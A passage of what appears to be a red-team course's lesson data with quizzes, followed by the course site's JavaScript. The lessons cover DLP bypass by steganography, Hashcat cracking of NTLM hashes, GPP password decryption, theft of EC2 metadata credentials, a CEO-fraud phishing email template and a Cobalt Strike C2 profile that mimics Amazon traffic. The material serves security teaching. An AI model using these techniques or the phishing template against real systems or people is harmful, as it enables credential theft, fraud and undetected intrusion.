                    "code": "# This example uses the 'stegano' library to hide a secret message inside an image.\nfrom stegano import lsb\n\n# The secret data to exfiltrate\nsecret_message = \"This is top secret data about Project Kronos.\"\n\n# The cover image that will hide the data\ninput_image = \"corporate_logo.png\"\noutput_image = \"exfil_image.png\"\n\n# Hide the secret message in the image using the Least Significant Bit (LSB) technique\nsecret_image = lsb.hide(input_image, secret_message)\nsecret_image.save(output_image)\n\n# The attacker can now exfiltrate 'exfil_image.png'.\n# To a DLP system, it just looks like an image file.\n\n# To retrieve the secret on the other side:\nclear_message = lsb.reveal(output_image)\nprint(f\"Recovered secret: {clear_message}\")"
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the primary function of a Data Loss Prevention (DLP) system?",
                        "options": [
                            "To prevent malware from running.",
                            "To inspect outbound traffic to detect and block the unauthorized exfiltration of sensitive data.",
                            "To manage user passwords.",
                            "To act as a firewall."
                        ],
                        "correct": 1,
                        "explanation": "DLP is a data-centric control. Its job is to understand what data is sensitive and to prevent that specific data from leaving the network."
                    },
                    {
                        "id": 2,
                        "question": "What is the most effective and common method for bypassing a DLP system?",
                        "options": [
                            "Sending the data in small chunks.",
                            "Renaming the file.",
                            "Placing the sensitive data inside a strong, password-protected encrypted archive (like a ZIP file).",
                            "Sending the data during off-hours."
                        ],
                        "correct": 2,
                        "explanation": "If the DLP system cannot decrypt the archive, it cannot inspect the content. This is a fundamental blindness that attackers frequently exploit. Many organizations block all outbound encrypted archives for this reason."
                    },
                    {
                        "id": 3,
                        "question": "The technique of hiding a secret message inside the pixels of an image is known as what?",
                        "options": [
                            "Encryption",
                            "Steganography",
                            "Encoding",
                            "Compression"
                        ],
                        "correct": 1,
                        "explanation": "Steganography is the art of concealed writing. It is an effective DLP bypass because the DLP scanner sees a benign container file (an image) and may not have the capability to detect the hidden data within it."
                    }
                ]
            }
        },
        {
            "id": "lesson-20",
            "title": "Bypassing Password Policies and Credential Defenses",
            "duration": "75 min",
            "objectives": [
                "Understand how attackers can abuse password reuse",
                "Learn the principles of offline password cracking",
                "Explore how to use tools like Hashcat to crack NTLM hashes",
                "Analyze the effectiveness of different password hashing algorithms",
                "Practice cracking a set of dumped password hashes"
            ],
            "content": {
                "overview": "Even with strong password policies, user credentials remain a primary target for attackers. This lesson covers the techniques used to bypass these policies, focusing on the powerful method of offline password cracking, where an attacker who has dumped password hashes can recover the plaintext passwords without any interaction with the live systems.",
                "sections": [
                    {
                        "title": "Abusing Password Reuse",
                        "content": "<p>A common scenario is a <strong>credential stuffing</strong> attack. An attacker will take a list of usernames and passwords from a data breach at one company (e.g., Company A) and will systematically try those same credentials against the login portal of a different company (e.g., Company B). </p><p>Because many users reuse the same password across multiple services, this attack is often highly effective. This bypasses the password policy of Company B entirely, as the attacker is using the user's real, valid password.</p>",
                        "image": "https://images.unsplash.com/photo-1554224155-169544351748?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "Offline Password Cracking",
                        "content": "<p>This is a post-exploitation technique. After an attacker has compromised a system and dumped the password hashes (e.g., from an Active Directory Domain Controller), they can take these hashes offline to their own powerful cracking rig.</p><p>Unlike an online brute-force attack (which is slow and generates logs), an <strong>offline cracking</strong> attack is invisible to the defenders and can be massively parallelized. The attacker uses a tool like <strong>Hashcat</strong> to try billions of password guesses per second against the stolen hashes without any risk of being detected or locking out accounts.</p>",
                        "image": "https://i.imgur.com/k2H1z5F.png"
                    },
                    {
                        "title": "Cracking with Hashcat",
                        "content": "<p><strong>Hashcat</strong> is the world's fastest and most advanced password recovery utility. It can leverage the power of modern GPUs to perform incredibly fast cracking.</p><div class='info-box note'><div class='info-box-header'><i class='fas fa-info-circle'></i><strong>Attack Modes</strong></div><p>Hashcat can use several different attack modes:<ul><li><strong>Dictionary Attack:</strong> Try every password in a large wordlist (e.g., `rockyou.txt`).</li><li><strong>Combinator Attack:</strong> Combine two wordlists (e.g., try every word from list A followed by every word from list B).</li><li><strong>Mask Attack (Brute-Force):</strong> Try every possible combination of characters for a given pattern. For example, a mask of `?u?l?l?l?l?l?l?d!` would try every 8-character password that starts with an uppercase letter, is followed by 6 lowercase letters, and ends with a digit and an exclamation mark.</li></ul></p></div>",
                        "image": "https://images.unsplash.com/photo-1573495627361-ab2d_50a8a86a?w=800&h=400&fit=crop"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "hashcat -m 1000 ntlm_hashes.txt /path/to/rockyou.txt",
                    "language": "bash",
                    "code": "# This command uses Hashcat to crack NTLM password hashes.\n\n# -m 1000: The hash type mode. Mode 1000 is for NTLM.\n# ntlm_hashes.txt: The input file containing the hashes dumped from a Windows machine.\n# /path/to/rockyou.txt: The wordlist to use for the dictionary attack.\n\n# --- Example of running a mask attack ---\n# This will try all 8-character passwords that follow the pattern of\n# an uppercase letter, 6 lowercase letters, and a number.\n# e.g., 'Password1', 'Password2', etc.\nhashcat -m 1000 -a 3 ntlm_hashes.txt ?u?l?l?l?l?l?l?d"
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is a credential stuffing attack?",
                        "options": [
                            "A brute-force attack.",
                            "An attack where a list of credentials from one data breach is tried against a different service.",
                            "A phishing attack.",
                            "A form of malware."
                        ],
                        "correct": 1,
                        "explanation": "Credential stuffing exploits the widespread problem of password reuse. It's a highly automated and effective attack for gaining initial access."
                    },
                    {
                        "id": 2,
                        "question": "What is the primary advantage of offline password cracking over an online attack?",
                        "options": [
                            "It is easier.",
                            "It is stealthy (it generates no noise or logs on the target network) and can be massively parallelized.",
                            "It does not require a wordlist.",
                            "It is guaranteed to succeed."
                        ],
                        "correct": 1,
                        "explanation": "An online attack is limited by network speed and account lockout policies. An offline attack is limited only by the attacker's own hardware, allowing them to make billions of guesses per second with no risk of detection."
                    },
                    {
                        "id": 3,
                        "question": "The tool Hashcat is used for what purpose?",
                        "options": [
                            "To dump password hashes from memory.",
                            "To perform high-speed, offline password cracking.",
                            "To manage a C2 server.",
                            "To send phishing emails."
                        ],
                        "correct": 1,
                        "explanation": "Hashcat is the industry-standard tool for offline cracking. It is highly optimized to use GPUs to accelerate the process of cracking password hashes."
                    }
                ]
            }
        },
        {
            "id": "lesson-21",
            "title": "Bypassing Active Directory Group Policies (GPOs)",
            "duration": "75 min",
            "objectives": [
                "Understand the function of Group Policy Objects (GPOs) in AD",
                "Learn how to enumerate GPOs to find weak settings",
                "Explore how to exploit file and registry permissions set by GPOs",
                "Analyze how to find credentials stored in Group Policy Preferences (GPP)",
                "Practice using PowerView to find abusable GPOs"
            ],
            "content": {
                "overview": "Group Policies are the primary way that administrators manage and enforce security settings across a Windows domain. However, these policies themselves can be misconfigured, creating vulnerabilities that an attacker can exploit for privilege escalation and lateral movement. This lesson covers how to find and abuse weak Group Policy settings.",
                "sections": [
                    {
                        "title": "Understanding Group Policy",
                        "content": "<p>A <strong>Group Policy Object (GPO)</strong> is a collection of settings that administrators create to manage the configuration of user and computer accounts in Active Directory. GPOs can control everything from a user's desktop wallpaper to complex security settings like password policies and software restrictions.</p><p>These policies are stored in a folder called <strong>SYSVOL</strong> on the Domain Controllers. The SYSVOL folder is replicated across all DCs and is readable by all authenticated users. This means any domain user can read the content of these policy files.</p>",
                        "image": "https://i.imgur.com/3Z4h7k2.png"
                    },
                    {
                        "title": "Finding Passwords in Group Policy Preferences (GPP)",
                        "content": "<p>A classic but still sometimes found vulnerability is the storage of passwords in <strong>Group Policy Preferences (GPP)</strong>. Administrators used to use GPP to set local administrator passwords or run scheduled tasks as a specific user. The password for these operations was stored in an XML file in the SYSVOL share.</p><p>The password was encrypted with a publicly known AES key. An attacker with read access to SYSVOL (i.e., any domain user) can find these XML files, extract the encrypted password (cpassword), and use the public key to decrypt it, revealing a plaintext password, often for a privileged account.</p>",
                        "image": "https://images.unsplash.com/photo-1599508704512-2f19efd1e_35f?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "Abusing Weak Permissions",
                        "content": "<p>An attacker can enumerate all the GPOs in a domain and look for policies that set weak file or registry permissions.</p><div class='info-box warning'><div class='info-box-header'><i class='fas fa-exclamation-triangle'></i><strong>GPO-based Privilege Escalation</strong></div><p>Imagine a GPO that is applied to all workstations. The attacker discovers that this GPO sets permissions on the `C:\\Program Files\\SomeApp` directory to give the 'Domain Users' group 'Full Control'. If the service for 'SomeApp' runs as a privileged user (like SYSTEM), this is a privilege escalation vulnerability. The attacker, as a standard domain user, can simply replace the application's legitimate executable with their own payload. The next time the service starts, the attacker's payload will be executed with SYSTEM privileges.</p></div>",
                        "image": "https://images.unsplash.com/photo-1573495627361-ab2d_50a8a86a?w=800&h=400&fit=crop"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "Find_GPO_Password_in_SYSVOL.ps1",
                    "language": "powershell",
                    "code": "# This command uses the PowerView PowerShell module to find and decrypt GPP passwords.\n\n# Import the PowerView script\nImport-Module .\\PowerView.ps1\n\n# Run the function to search SYSVOL for XML files containing the 'cpassword' field\n# and automatically decrypt them.\nGet-NetGPO -ComputerName dcorp-dc01.corp.local | Get-GPPPassword\n\n# --- Sample Output ---\n# GpoName             : {B2809A1E-D396-411A-9E9A-37A24A67B42B}\n# Changed             : 2022-01-10 10:00:00\n# Cpassword           : A...Z (Encrypted String)\n# NewName             : local-admin\n# Password            : MySuperSecurePassword123!   <-- Plaintext password revealed!"
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the SYSVOL folder on a Domain Controller?",
                        "options": [
                            "It is a folder that is only accessible to Domain Admins.",
                            "It is a folder that is replicated across all DCs and is readable by all authenticated users, containing Group Policy information.",
                            "It is where the password hashes are stored.",
                            "It is a share for user home directories."
                        ],
                        "correct": 1,
                        "explanation": "The fact that SYSVOL is readable by any domain user is a key part of why these misconfigurations can be discovered. It allows any user to audit the policies that apply to them and others."
                    },
                    {
                        "id": 2,
                        "question": "What is the Group Policy Preferences (GPP) password vulnerability?",
                        "options": [
                            "A vulnerability in the Kerberos protocol.",
                            "A legacy feature where passwords stored in GPP XML files in SYSVOL were encrypted with a publicly known key.",
                            "A way to change a user's password without knowing the old one.",
                            "A new vulnerability discovered last year."
                        ],
                        "correct": 1,
                        "explanation": "This is a well-known, old vulnerability. While Microsoft has patched the ability to set new GPP passwords, many organizations may still have old policy files containing these decryptable passwords lingering in their SYSVOL share."
                    },
                    {
                        "id": 3,
                        "question": "How can a GPO that sets weak file permissions lead to privilege escalation?",
                        "options": [
                            "It cannot.",
                            "By giving a standard user write access to a file or folder that is used by a higher-privileged process.",
                            "By allowing a user to read a sensitive file.",
                            "By changing the desktop wallpaper."
                        ],
                        "correct": 1,
                        "explanation": "If a GPO gives a low-privilege user control over a file that a high-privilege service depends on, the user can modify or replace that file to hijack the execution flow of the service, leading to privilege escalation."
                    }
                ]
            }
        },
        {
            "id": "lesson-22",
            "title": "Bypassing Cloud Security Controls (IAM Misconfigurations)",
            "duration": "75 min",
            "objectives": [
                "Understand the basics of Identity and Access Management (IAM) in the cloud",
                "Learn how to exploit overly permissive IAM roles",
                "Explore techniques for chaining permissions to escalate privileges",
                "Analyze the use of tools like Pacu for cloud exploitation",
                "Discuss the principle of least privilege in a cloud context"
            ],
            "content": {
                "overview": "In cloud environments like AWS, Azure, and GCP, Identity and Access Management (IAM) is the new security perimeter. Misconfigurations in IAM policies are the number one cause of cloud breaches. This lesson covers how attackers find and exploit these misconfigurations to escalate privileges and gain access to sensitive data in the cloud.",
                "sections": [
                    {
                        "title": "Cloud IAM and Overly Permissive Roles",
                        "content": "<p><strong>IAM</strong> determines who (a user, a role, a virtual machine) can do what (actions like `s3:GetObject`, `ec2:RunInstances`) on which resources. A common misconfiguration is to grant a role or user <strong>overly permissive</strong> privileges.</p><p>For example, a developer might give an EC2 virtual machine a role with the permission `s3:*` (full access to all S3 storage buckets) for a quick test, and then forget to scope it down. An attacker who compromises this single EC2 instance can now inherit its role and use it to read, modify, and delete data in *every single S3 bucket* in the entire AWS account.</p>",
                        "image": "https://i.imgur.com/fgS4fG3.png"
                    },
                    {
                        "title": "Privilege Escalation by Chaining Permissions",
                        "content": "<p>Cloud privilege escalation is often not a single exploit, but a process of <strong>chaining</strong> together multiple, seemingly minor permissions to achieve a powerful outcome.</p><h3>Example AWS Escalation Path:</h3><ol><li>An attacker compromises a user with the `iam:CreatePolicyVersion` permission. This allows them to edit an existing IAM policy.</li><li>They find a policy that is attached to a more privileged role and add a new permission to it, such as `iam:PassRole`.</li><li>The `iam:PassRole` permission allows them to 'pass' a role to a new service, like a new EC2 instance.</li><li>They can now launch a new EC2 instance, attach the highly privileged role to it, and then SSH into that instance to inherit its god-like permissions.</li></ol><p>Each individual permission was not a direct path to admin, but together they formed a privilege escalation chain.</p>",
                        "image": "https://i.imgur.com/kYq3Q6k.png"
                    },
                    {
                        "title": "Cloud Exploitation Frameworks: Pacu",
                        "content": "<p>Manually finding these complex chains of permissions is difficult. <strong>Pacu</strong> is an open-source AWS exploitation framework, developed by Rhino Security Labs, that automates this process.</p><div class='info-box note'><div class='info-box-header'><i class='fas fa-info-circle'></i><strong>The Attacker's Assistant</strong></div><p>After providing it with a set of compromised AWS keys, Pacu can automatically enumerate all the IAM permissions for that user. It will then analyze these permissions and suggest potential privilege escalation paths. It contains modules to automatically execute these attacks, making it a powerful tool for testing the security of an AWS environment.</p></div>",
                        "image": "https://images.unsplash.com/photo-1573495627361-ab2d_50a8a86a?w=800&h=400&fit=crop"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "aws s3 ls (Checking permissions after assuming a role)",
                    "language": "bash",
                    "code": "# This example shows a manual check for an overly permissive S3 policy.\n\n# 1. An attacker compromises an EC2 instance. They get the temporary credentials\n#    for the IAM role attached to the instance from the metadata service.\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-S3-Access-Role\n\n# 2. The attacker configures their AWS CLI to use these stolen keys.\nexport AWS_ACCESS_KEY_ID=ASIA... \nexport AWS_SECRET_ACCESS_KEY=... \nexport AWS_SESSION_TOKEN=...\n\n# 3. The attacker now tests what they can do with these keys.\n#    They try to list all S3 buckets in the account.\naws s3 ls\n\n# If the command returns a list of all buckets, including ones the EC2 instance\n# has no business accessing, this indicates a critical IAM misconfiguration."
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the most common cause of security breaches in cloud environments?",
                        "options": [
                            "Software vulnerabilities in the cloud provider's hypervisor.",
                            "Misconfigurations of Identity and Access Management (IAM) policies.",
                            "Denial-of-service attacks.",
                            "Phishing attacks against cloud provider employees."
                        ],
                        "correct": 1,
                        "explanation": "While other threats exist, the vast majority of cloud breaches are the result of customer-side misconfigurations, such as creating overly permissive IAM roles or public S3 buckets."
                    },
                    {
                        "id": 2,
                        "question": "What is meant by 'chaining' permissions in a cloud privilege escalation attack?",
                        "options": [
                            "A type of social engineering.",
                            "The process of combining multiple, seemingly low-risk permissions to achieve a high-impact outcome.",
                            "A network-based attack.",
                            "It is not a real technique."
                        ],
                        "correct": 1,
                        "explanation": "Cloud privilege escalation is often a complex, multi-step process. An attacker will leverage one permission to gain another, and so on, until they reach their objective. Tools like Pacu help to automate the discovery of these chains."
                    },
                    {
                        "id": 3,
                        "question": "What is the purpose of a tool like Pacu?",
                        "options": [
                            "To secure a cloud environment.",
                            "It is an AWS exploitation framework that helps to automate the process of enumerating and exploiting IAM misconfigurations.",
                            "It is a cloud monitoring tool.",
                            "It is used to manage cloud billing."
                        ],
                        "correct": 1,
                        "explanation": "Pacu is a red teamer's tool for AWS. It is designed to automate the discovery and exploitation of the complex privilege escalation paths that can exist in an IAM configuration."
                    }
                ]
            }
        },
        {
            "id": "lesson-23",
            "title": "Social Engineering to Bypass the Human Control Layer",
            "duration": "75 min",
            "objectives": [
                "Understand the role of the human as a security control",
                "Explore the principles of influence: authority, urgency, and trust",
                "Learn how to use phishing, pretexting, and baiting to manipulate users",
                "Design a convincing phishing email template for a specific scenario"
            ],
            "content": {
                "overview": "Sometimes, the easiest way to bypass a technical control is to not touch it at all, but to trick a legitimate user into bypassing it for you. This lesson covers the art and science of social engineering, the psychological manipulation of people into performing actions or divulging confidential information.",
                "sections": [
                    {
                        "title": "The Human Firewall",
                        "content": "<p>An aware and skeptical user is one of the most effective security controls an organization can have. Conversely, an unsuspecting user is often the weakest link. Social engineering attacks target the human, not the computer.</p><h3>Core Principles of Influence:</h3><p>Most social engineering attacks are based on a few core principles of human psychology:<ul><li><strong>Authority:</strong> People are more likely to comply with a request if it appears to come from a person in authority (e.g., the CEO, the IT director).</li><li><strong>Urgency:</strong> Attackers create a sense of urgency to pressure the victim into acting without thinking (e.g., 'This invoice must be paid in the next 5 minutes!').</li><li><strong>Trust/Liking:</strong> The attacker will try to build rapport or impersonate a trusted colleague or vendor.</li></ul></p>",
                        "image": "https://images.unsplash.com/photo-1521791136064-7986c2920216?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "Social Engineering Techniques",
                        "content": "<ul><li><strong>Phishing:</strong> As covered before, this is the use of email to trick a user into clicking a link, opening an attachment, or revealing credentials.</li><li><strong>Pretexting:</strong> This is the practice of creating an invented scenario (a pretext) to engage a targeted victim in a way that increases the chance the victim will divulge information. For example, an attacker might call the help desk, pretending to be a new employee who has forgotten their password.</li><li><strong>Baiting:</strong> The attacker leaves a malware-infected device (like a USB stick) in a place where an employee will find it. The device is often labeled with something enticing, like '2024 Salary Information'. The attacker relies on the victim's curiosity to get them to plug the device into their computer.</li></ul>",
                        "image": "https://i.imgur.com/k2H1z5F.png"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "Crafting_a_Convincing_Phishing_Email_Template.html",
                    "language": "html",
                    "code": "<!-- A pretext based on urgency and authority -->\n<html>\n<body>\n  <p>Team,</p>\n  <p>I'm in a series of back-to-back meetings and my phone is about to die, but I need this paid immediately to close the deal. Please process the attached invoice for our new partner, 'Synergy Corp', as soon as possible and let me know when it's done.</p>\n  \n  <p>This is critical for our Q4 numbers.</p>\n\n  <p>Thanks,</p>\n  <p><strong>John Doe</strong></p>\n  <p><em>CEO, MegaCorp</em></p>\n  <p><em>(Sent from my iPhone)</em></p>\n</body>\n</html>"
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the primary target of a social engineering attack?",
                        "options": [
                            "A firewall.",
                            "A web server.",
                            "A human being.",
                            "An antivirus product."
                        ],
                        "correct": 2,
                        "explanation": "Social engineering is the art of psychological manipulation. It bypasses technical controls by exploiting human trust, curiosity, and fear."
                    },
                    {
                        "id": 2,
                        "question": "An attacker calling an employee and pretending to be from the IT help desk to trick them into revealing their password is an example of what?",
                        "options": [
                            "Phishing",
                            "Baiting",
                            "Pretexting",
                            "A technical exploit."
                        ],
                        "correct": 2,
                        "explanation": "Pretexting is the act of creating and using an invented scenario (the pretext) to engage a target. The 'IT help desk' story is a classic pretext."
                    },
                    {
                        "id": 3,
                        "question": "An email from the 'CEO' that says 'I need you to process this wire transfer immediately, I'm about to get on a plane!' is using which two principles of influence?",
                        "options": [
                            "Trust and Liking",
                            "Authority and Urgency",
                            "Scarcity and Consistency",
                            "Likability and Social Proof"
                        ],
                        "correct": 1,
                        "explanation": "The email leverages the CEO's authority to make the request seem legitimate, and the sense of urgency to pressure the victim into acting without performing the proper verification steps."
                    }
                ]
            }
        },
        {
            "id": "lesson-24",
            "title": "Obfuscation and Hiding in Plain Sight",
            "duration": "75 min",
            "objectives": [
                "Understand the goal of obfuscation in an attack",
                "Learn how to use Malleable C2 profiles to blend C2 traffic",
                "Explore techniques for hiding data and tools in expected locations",
                "Analyze the trade-offs between stealth and operational complexity"
            ],
            "content": {
                "overview": "The best place to hide is in plain sight. This lesson covers the advanced art of obfuscation and blending in, where an attacker's tools, traffic, and actions are designed to look as much like normal, legitimate activity as possible. This is a key skill for bypassing sophisticated behavioral detection and human analysts.",
                "sections": [
                    {
                        "title": "Blending C2 Traffic",
                        "content": "<p>As covered in a previous lesson, <strong>Malleable C2</strong> profiles are the primary tool for this. The goal is to make the beacon's network traffic indistinguishable from the legitimate traffic that is already on the network.</p><p>A skilled operator will perform reconnaissance on the target's web traffic first. They will identify a common application that the target uses (e.g., Microsoft Teams, Google Drive) and will then configure their C2 profile to exactly mimic the HTTP headers, URIs, and data formats of that application's traffic. This makes it incredibly difficult for a network analyst to find the malicious beacon in the sea of legitimate traffic.</p>",
                        "image": "https://i.imgur.com/k2H1z5F.png"
                    },
                    {
                        "title": "Hiding Tools and Data",
                        "content": "<p>Attackers will also try to hide their tools and staged data in plain sight.</p><ul><li><strong>Naming Conventions:</strong> Instead of naming a tool `mimikatz.exe`, an attacker will rename it to something that looks like a legitimate system file, like `svchost.exe` (with a typo) or `updater.exe`.</li><li><strong>File Locations:</strong> Instead of dropping their tools in an obvious place like the user's Desktop, they will hide them in a deep, obscure system folder that already contains thousands of other files, like `C:\\Windows\\System32\\` or a temporary application data folder.</li><li><strong>Alternate Data Streams (ADS):</strong> On an NTFS file system, an attacker can hide their tool inside an 'alternate data stream' of a legitimate file. The tool is not visible to a normal `dir` command, but can still be executed.</li></ul>",
                        "image": "https://images.unsplash.com/photo-1599508704512-2f19efd1e_35f?w=800&h=400&fit=crop"
                    }
                ],
                "codeExamples": [
                    {
                        "title": "Cobalt_Strike_Malleable_C2_Profile_for_Amazon.profile",
                        "language": "properties",
                        "code": "# This is a real Malleable C2 profile that mimics Amazon's API.\n# Source: https://github.com/threatexpress/malleable-c2\n\nset sample_name \"amazon\";\nset sleeptime \"30000\"; # 30 seconds\nset jitter    \"10\";\n\nhttp-get {\n    set uri \"/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books\";\n    client {\n        header \"Host\" \"www.amazon.com\";\n        header \"Accept\" \"*/*\";\n        metadata {\n            # Hide metadata in a session ID cookie\n            cookie \"session-id\";\n        }\n    }\n    server {\n        header \"Server\" \"Server\";\n        header \"Content-Type\" \"text/html; charset=UTF-8\";\n        output {\n            # Prepend a legitimate-looking HTML comment\n            prepend \"<!doctype html><!-- sp-concat-css-assets-6 -->\";\n            print;\n        }\n    }\n}"
                    }
                ]
            },
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the primary goal of obfuscation and 'hiding in plain sight'?",
                        "options": [
                            "To make the attack run faster.",
                            "To make the attacker's activity blend in with normal system and network traffic to evade detection by human analysts and behavioral monitoring tools.",
                            "To exploit a software vulnerability.",
                            "To gain initial access."
                        ],
                        "correct": 1,
                        "explanation": "This is a key principle of stealthy tradecraft. The more an attacker can make their actions look like those of a legitimate user or administrator, the less likely they are to be caught."
                    },
                    {
                        "id": 2,
                        "question": "What is the purpose of a Malleable C2 profile?",
                        "options": [
                            "To make the C2 beacon run faster.",
                            "To customize the network indicators of a C2 beacon to make it blend in with legitimate traffic.",
                            "To manage persistence.",
                            "To generate payloads."
                        ],
                        "correct": 1,
                        "explanation": "Malleable C2 is an evasion technique. Its goal is to make the beacon's network traffic look like a common, benign application to evade detection by network security monitoring tools."
                    },
                    {
                        "id": 3,
                        "question": "Renaming a malicious tool from `hack.exe` to `firefox_updater.exe` and placing it in a temporary folder is an example of what?",
                        "options": [
                            "Persistence.",
                            "Lateral Movement.",
                            "Hiding tools and data in plain sight.",
                            "Privilege Escalation."
                        ],
                        "correct": 2,
                        "explanation": "This is a simple but effective obfuscation technique. A defender who is quickly looking at a list of running processes is much less likely to be suspicious of `firefox_updater.exe` than `hack.exe`."
                    }
                ]
            }
        },
        {
            "id": "lesson-25",
            "title": "Tooling for Automation: Frameworks and Scanners",
            "duration": "75 min",
            "objectives": [
                "Understand the role of frameworks like Metasploit in automating exploitation",
                "Learn how vulnerability scanners can be used to find initial targets",
                "Explore the integration of different tools in an attack chain",
                "Analyze the difference between manual and automated testing"
            ],
            "content": {
                "overview": "While many red team actions are highly manual and creative, operators rely heavily on automation and frameworks to handle common tasks like scanning, exploitation, and payload generation. This lesson provides an overview of the key tools that are used to automate and scale adversary simulation.",
                "sections": [
                    {
                        "title": "Vulnerability Scanners",
                        "content": "<p>A <strong>vulnerability scanner</strong> is an automated tool that scans a system or network for known vulnerabilities. This is often the first step in an engagement after the initial OSINT.</p><h3>Examples:</h3><ul><li><strong>Nmap:</strong> While primarily a network mapper, its Nmap Scripting Engine (NSE) can detect a wide range of common vulnerabilities.</li><li><strong>Nessus / OpenVAS:</strong> These are dedicated, comprehensive vulnerability scanners that have a massive database of checks for missing patches, default passwords, and common misconfigurations.</li></ul><p>The output of a vulnerability scanner provides a red teamer with a list of potential targets for exploitation.</p>",
                        "image": "https://images.unsplash.com/photo-1510915228340-29c85a43dcfe?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "Exploitation Frameworks",
                        "content": "<p>An <strong>exploitation framework</strong> is a tool that bundles together a large number of exploits, payloads, and post-exploitation modules into a single, consistent interface. The most famous of these is the <strong>Metasploit Framework</strong>.</p><p>Metasploit allows an operator to:<ul><li>Choose an exploit for a specific vulnerability.</li><li>Choose a payload to be delivered by the exploit (e.g., a reverse shell).</li><li>Configure the necessary options (like the target IP and the C2 callback IP).</li><li>Launch the exploit.</li></ul>It automates the entire exploitation process, from creating the malicious payload to handling the incoming shell.</p>",
                        "image": "https://i.imgur.com/k2H1z5F.png"
                    }
                ],
                "codeExamples": [
                    {
                        "title": "nmap --script=vuln <target_ip>",
                        "language": "bash",
                        "code": "# Nmap is a powerful network scanner.\n# This command tells Nmap to scan a target IP.\n\n# --script=vuln : Run all the scripts in the 'vuln' category.\n# The NSE scripts can detect a wide range of common, known vulnerabilities.\n\n# --- Sample Output ---\n# PORT      STATE SERVICE\n# 21/tcp    open  ftp\n# | ftp-vuln-cve2010-4221: VULNERABLE!\n# |   State: LIKELY VULNERABLE\n# |_  Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-4221\n#\n# 80/tcp    open  http\n# | http-vuln-cve2017-5638: VULNERABLE!\n# |_  Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638"
                    }
                ]
            },
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the primary purpose of a vulnerability scanner like Nessus or Nmap's NSE?",
                        "options": [
                            "To automatically exploit all vulnerabilities.",
                            "To automatically scan a system or network for known vulnerabilities and misconfigurations.",
                            "To manage a C2 server.",
                            "To write a report."
                        ],
                        "correct": 1,
                        "explanation": "A scanner is a reconnaissance tool. Its job is to find the potential weaknesses, which the human operator can then prioritize and attempt to exploit manually or with a framework."
                    },
                    {
                        "id": 2,
                        "question": "What is an exploitation framework like Metasploit used for?",
                        "options": [
                            "To provide an integrated platform that automates the entire exploitation process, from choosing an exploit to generating a payload and handling the resulting shell.",
                            "To scan for vulnerabilities.",
                            "To perform OSINT.",
                            "To write a report."
                        ],
                        "correct": 0,
                        "explanation": "Metasploit is a force multiplier for an operator. It contains a massive, curated library of public exploits and a powerful payload generation engine, which dramatically speeds up the exploitation phase."
                    },
                    {
                        "id": 3,
                        "question": "What is the relationship between a vulnerability scanner and an exploitation framework?",
                        "options": [
                            "They are the same thing.",
                            "They are not related.",
                            "A scanner is used to *find* potential vulnerabilities, and an exploitation framework is used to *exploit* them.",
                            "An exploitation framework is used to find vulnerabilities."
                        ],
                        "correct": 2,
                        "explanation": "This is a common workflow. The operator will first use a scanner to get the 'lay of the land' and find potential targets. They will then use a framework like Metasploit to try and exploit the specific vulnerabilities that the scanner found."
                    }
                ]
            }
        }
    ]
}


      // =====================================================
      // GLOBAL VARIABLES
      // =====================================================
      let currentUser = null;
      let currentLessonIndex = 0;
      let courseProgress = {};
      let userStats = {};
      let quizState = {
        currentQuestion: 0,
        answers: [],
        score: 0,
        isComplete: false,
        timeStarted: null,
        timeCompleted: null,
        currentQuestionIndex: 0,
      };

      // Enhanced session tracking
      let courseSession = {
        startTime: null,
        totalStudyTime: 0,
        lessonsStarted: 0,
        lessonsCompleted: 0,
        pageLoadTime: new Date(),
        lastActive: new Date(),
        interactions: 0,
        completedSections: [],
        totalTime: 0,
        interactionCount: 0,
        lastActivityTime: new Date(),
      };

      // Music Player Variables
      let audioPlayer = new Audio();

      // Achievement notification system
      let notificationQueue = [];
      let isShowingNotification = false;

      // =====================================================
      // INITIALIZATION
      // =====================================================
      document.addEventListener("DOMContentLoaded", async () => {
        try {
          showLoadingScreen();
          await checkAuth();

          if (currentUser) {
            // Initialize session tracking
            startCourseSession();

            // Load course data and progress
            await loadCourseData();
            await loadUserProfile();
            await loadProgress();

            // Initialize UI
            initializeEventListeners();
            renderSidebar();
            loadLesson(currentLessonIndex);

            // Initialize additional features
            initMusicPlayer();
            addMusicIndicator();
            initializeActivityTracking();

            hideLoadingScreen();
          } else {
            openAuthModal();
          }
        } catch (error) {
          console.error("Error initializing course:", error);
          hideLoadingScreen();
          showToast("Failed to initialize course system", "error");
        }
      });

      // =====================================================
      // AUTHENTICATION SYSTEM
      // =====================================================
      async function checkAuth() {
        try {
          const {
            data: { session },
            error,
          } = await supabase.auth.getSession();

          if (error) {
            console.error("Auth error:", error);
            currentUser = null;
            openAuthModal();
            return;
          }

          if (!session) {
            currentUser = null;
            openAuthModal();
            return;
          }

          currentUser = session.user;
          updateUIWithUser();
        } catch (error) {
          console.error("Error checking auth:", error);
          currentUser = null;
          openAuthModal();
        }
      }

      function updateUIWithUser() {
        if (!currentUser) return;

        const name =
          currentUser.user_metadata?.full_name ||
          currentUser.email.split("@")[0];
        const userElements = document.querySelectorAll("[data-user-name]");
        userElements.forEach((el) => (el.textContent = name));
      }

      // =====================================================
      // USER PROFILE & STATS MANAGEMENT
      // =====================================================
